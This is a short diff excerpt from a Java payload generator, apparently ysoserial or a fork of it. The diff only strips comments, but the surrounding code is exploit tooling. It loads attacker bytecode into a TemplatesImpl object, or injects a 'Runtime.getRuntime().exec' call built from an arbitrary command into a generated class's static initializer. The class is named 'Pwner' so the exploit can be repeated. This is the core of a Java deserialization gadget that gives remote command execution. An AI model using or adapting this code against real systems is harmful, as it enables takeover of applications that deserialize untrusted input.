@@ -133,16 +133,13 @@ public class Gadgets {
             classBytes = CommonUtils.readClassByte(classfile);
             Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
             Reflections.setFieldValue(templates, "_name", "Pwnr");
-//            Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
             return templates;
         } else {
             cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                 command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                 "\");";
         }
-        // 插入我们自己的代码
         clazz.makeClassInitializer().insertAfter(cmd);
-        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
         clazz.setSuperclass(superC);
